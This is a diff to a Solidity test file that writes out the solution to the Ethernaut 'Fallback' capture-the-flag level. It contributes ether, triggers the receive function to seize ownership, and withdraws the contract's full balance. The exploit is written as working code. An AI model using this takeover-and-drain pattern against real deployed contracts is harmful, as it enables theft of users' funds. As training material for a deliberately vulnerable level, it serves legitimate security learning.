@@ -31,6 +31,18 @@ contract FallbackTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        ethernautFallback.contribute{value: 10_000}();
+        
+        assertEq(ethernautFallback.getContribution(), 10_000, "Contribution didn't go through");
+
+        (bool success, ) = address(ethernautFallback).call{value: 100}("");
+
+        assertTrue(success, "Call to receive() didn't go through");
+        assertEq(ethernautFallback.owner(), eoaAddress, "Wrong owner");
+
+        ethernautFallback.withdraw();
+
+        assertEq(address(ethernautFallback).balance, 0, "Wrong level balance");
 
         //////////////////////
         // LEVEL SUBMISSION //
